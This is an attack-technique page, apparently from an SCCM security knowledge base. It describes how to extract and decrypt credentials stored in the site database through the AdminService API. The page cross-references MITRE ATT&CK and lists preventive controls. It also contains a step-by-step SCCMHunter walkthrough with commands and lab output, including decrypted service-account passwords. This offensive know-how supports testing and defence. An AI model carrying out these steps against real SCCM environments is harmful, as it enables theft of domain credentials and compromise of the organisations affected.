# CRED-7

## Description
Retrieve credentials via AdminService API

## MITRE ATT&CK TTPs
- [TA0006 - Credential Access](https://attack.mitre.org/tactics/TA0006)
- [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)

## Requirements
Permitted security roles:
- Full Administrator
- Operations Administrator

## Summary
The SCCM AdminService API is a REST API that provides limited administrative access to the SCCM site. The API provides a WMI route at `http(s)://target.siteserver.domain/AdminService/wmi/` which exposes over 700 WMI classes, including the  `SMS_SCI_Reserved` class. This class maps to the `SC_UserAccount` table in the site database. Therefore, we can send a GET request to this endpoint to query any credential material stored in the site database.

All of these credentials are stored in the `SC_UserAccount` table in the site MSSQL database as hex-encoded, encrypted blobs. The secrets in this table are encrypted with an RSA private key which is stored in the "Microsoft Systems Management Server" cryptographic service provider (CSP) container on the primary site server *for the site the account was added to*.

[Garrett Foster](https://x.com/unsigned_sh0rt)'s [SCCMHunter](https://github.com/garrettfoster13/sccmhunter) operationalizes this by filtering the `Username`, `Reserved2` (encrypted password blob), and `AccountUsage` fields in the `get_creds` command, part of the `admin` module. SCCMHunter's `decrypt` command in the `admin` module allows decryption of the credential blobs using the site server's private key.

## Impact
This technique provides an alternative to [CRED-5](../CRED-5/cred-5_description.md) that does not require direct interaction with the database.

## Defensive IDs
- [PREVENT-10: Enforce the principle of least privilege for accounts](../../../defense-techniques/PREVENT/PREVENT-10/prevent-10_description.md)
- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)

## Examples

### SCCMHunter
First, we must use SCCMHunter's `admin` module to enter simulated shell access to the SMS Provider's AdminService APi.
```
┌──(impacket)─(kali㉿SCCM1-kali)-[~/sccmhunter]
└─$ python3 sccmhunter.py admin -u 'ludus\domainadmin' -p 'password' -ip 10.2.10.15
SCCMHunter v1.0.9 by @unsigned_sh0rt
[16:21:04] INFO     [!] Enter help for extra shell commands                                                                                                                                                                                            
() C:\ >> 

```

Next, we must obtain the site server's device ID (`ResourceId`) using `get_device <site server>`. Note: You must use only the hostname, not FQDN.
```
() C:\ >> get_device sccm-sitesrv
[16:24:04] INFO     ------------------------------------------                                                                                                                                         
                    Active: 1
                    Client: 1
                    DistinguishedName: CN=SCCM-SITESRV,OU=Servers,DC=ludus, DC=domain
                    FullDomainName: LUDUS.DOMAIN
                    IPAddresses: 10.2.10.15
                    LastLogonUserDomain: ludus
                    LastLogonUserName: domainuser
                    Name: SCCM-SITESRV
                    OperatingSystemNameandVersion: Microsoft Windows NT Server 10.0
                    PrimaryGroupID: 515
                    ResourceId: 16777223
                    ResourceNames: sccm-sitesrv.ludus.domain
                    SID: S-1-5-21-1740373489-3502891397-2242058250-1108
                    SMSInstalledSites: 123
                    SMSUniqueIdentifier: GUID:C798EE32-DFD0-4A21-BF95-2606755C0FE8
                    ------------------------------------------   
```

Now we can interact with the site server using `interact 16777223`:
```
() (C:\) >> interact 16777223
(16777223) (C:\) >> 
```

Next, we can run `get_creds` to query the credential blobs described above:
```
(16777223) (C:\) >> get_creds
[16:33:55] INFO     Tasked SCCM to extract all encrypted credential blobs                                                                                                                                                                              
{
    "@odata.context": "https://sccm-sitesrv.ludus.domain/AdminService/wmi/$metadata#SMS_SCI_Reserved",
    "value": [
        {
            "AccountUsage": [
                "Software Distribution"
            ],
            "Reserved2": "0C0100000B000000010200000366000000A40000081584A380F7995B0D32B802F64F4AFFA90ED6A55AC90B4709097708BF335FAA0330349FAED187B80221F596B847B1E9B4100E2616E8CE32E0DA95B4538DF2805036C700037BFCEA1C4CE4F6A61068491D2CB0BD09A50F908C7D2A7EE6C4319BC885A93431900A8DDF9CFC65CAF03F130A776E5C2ABAC5CCFB20018B78FA86433F3F7D2823AFB326491E1FA0D1C30E9E456E37532AE3FA16D8CED6A59D3C2FDC8DFE1FF951BC83761812997E1313A7873D0184D6B810159E54B108F9E0D60095FF29588C0F64FB122C244F307F614E0E2763A7CFDD84852F18090CC97F36233D46CC9485BE65DC32F6FD4794891315AED9321697F369F967CBFFC1CCE4E0CE25574758D15BD756B657C48C2D3A20172D",
            "UserName": "ludus\\sccm_naa"
        },
        {
            "AccountUsage": [
                "SMS_CLIENT_CONFIG_MANAGER"
            ],
            "Reserved2": "0C0100000B000000010200000366000000A400001863799C7980125997830A4246C99E25FB703F0C841AF8AE779AB6D3430E7B9F558E37D65F36D1B1124F36517060B0EF030B0B7F475282B17631AAB9AEE73FA2571123A17BC3372FD5181414B00D1B10AB460B010CA55140A214C7241D12EBCB2C40398A13998C142E81CC6629D4933722E6C2AD82B659B913BE33BCA579105220724C5D398FE75149A4309BCAC96FEFB8ACA81269721CAD4BAD6C16F66DA1A4C6F1E78639D13EA8EE9AF96543AD796B9D2F4EEF51259A4C2C6A1764A5EC519D8FF6B6F8592F58E44D9116360E22D20D8D9F996799EC5638046AF4E1BD4A4E97E31579A6611CF81B93DFE0A984B79390CCD7E3EDE0872ECFFA2CA7E9DC50BB14533921928A192CFF32256111424947F0",
            "UserName": "ludus\\sccm_push"
        },
        {
            "AccountUsage": [],
            "Reserved2": "0C01000008000000010200000366000000A40000EFFD218016601EB6BF46A099AA22017898B9246DB5FCBBEA8A2668E4E7BD37FCACC9B3FDA61407A9CDB65BD1F521939CACBDE3E1D23A4C4DB52F9CAD40D6E91F1ADBAEC1F121D9CC64122C70F768D9CC0411020AA5E5BD039DA2112C8370B30AB2EC0C0053EBA5901F5031BACD7A176D16C3008EDE3077F3B18BFC98056C865DB32E64FBBD524124CAF5AD542E6E96DF5CF7EDB62E7AEFCCF7533C84954E13555D2608EAD4C3DB921073320E58120B227E2683380A3A408EB0BF14DFB9B0D59259BC887D001BD30561D9110100D1719CB39B4CE4930CC488AA20A9B2585006B9C3DF2B3CE312677E71401B94FDF40B69EA8941480A6D0CB76E904023C5809496572D07C0EC003878A407255E4CE9976D",
            "UserName": "test"
        }
    ]
}
```

Finally, we run the `decrypt <blob>` (no quotes) command to decrypt the blobs from the previous step.

**OPSEC Note: This step will invoke a PowerShell script on the site server.**

```
(16777223) (C:\) >> decrypt 0C0100000B000000010200000366000000A40000081584A380F7995B0D32B802F64F4AFFA90ED6A55AC90B4709097708BF335FAA0330349FAED187B80221F596B847B1E9B4100E2616E8CE32E0DA95B4538DF2805036C700037BFCEA1C4CE4F6A61068491D2CB0BD09A50F908C7D2A7EE6C4319BC885A93431900A8DDF9CFC65CAF03F130A776E5C2ABAC5CCFB20018B78FA86433F3F7D2823AFB326491E1FA0D1C30E9E456E37532AE3FA16D8CED6A59D3C2FDC8DFE1FF951BC83761812997E1313A7873D0184D6B810159E54B108F9E0D60095FF29588C0F64FB122C244F307F614E0E2763A7CFDD84852F18090CC97F36233D46CC9485BE65DC32F6FD4794891315AED9321697F369F967CBFFC1CCE4E0CE25574758D15BD756B657C48C2D3A20172D
[16:37:59] INFO     Tasked SCCM to decrypt credential blob                                                                                                                                                                                             
[16:37:59] INFO     [+] Updates script created successfully with GUID 98b0ac33-6742-4422-8751-eb13cf8d37fd.                                                                                                                                            
[16:38:00] INFO     [+] Script with guid 98b0ac33-6742-4422-8751-eb13cf8d37fd approved.                                                                                                                                                                
[16:38:00] INFO     [+] Script with guid 98b0ac33-6742-4422-8751-eb13cf8d37fd executed.                                                                                                                                                                
[16:38:15] INFO     [+] Got result:                                                                                                                                                                                                                    
[16:38:15] INFO     Password123                                                                                                                                                                                                                        
[16:38:15] INFO     [+] Script with GUID 98b0ac33-6742-4422-8751-eb13cf8d37fd deleted.
```


## References
- Garrett Foster, [Site Takeover via SCCM's AdminService API](https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf)
- Garrett Foster, [Decrypting the Forest From the Trees](https://medium.com/specter-ops-posts/decrypting-the-forest-from-the-trees-661694ed1616)